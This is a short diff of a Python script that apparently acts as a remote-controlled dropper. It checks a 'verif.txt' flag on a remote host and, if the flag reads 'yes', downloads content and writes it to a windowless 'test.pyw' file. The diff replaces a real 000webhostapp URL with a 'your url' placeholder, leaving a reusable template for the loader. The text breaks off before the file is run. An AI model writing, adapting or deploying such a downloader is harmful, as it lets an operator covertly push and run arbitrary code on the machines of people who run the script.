@@ -5,10 +5,10 @@ import platform
 current_os = platform.system()
 nom_script = __file__
 try:
-    verif = requests.get("https://cordiform-hoop.000webhostapp.com/verif.txt")
+    verif = requests.get("your url/verif.txt")
     verif = verif.text
     if verif == "yes":
-        look = requests.get("https://cordiform-hoop.000webhostapp.com/test.txt")
+        look = requests.get("your url/test.txt")
         look = look.text
         nom_fichier = "test.pyw"
         with open(nom_fichier, 'w') as fichier:
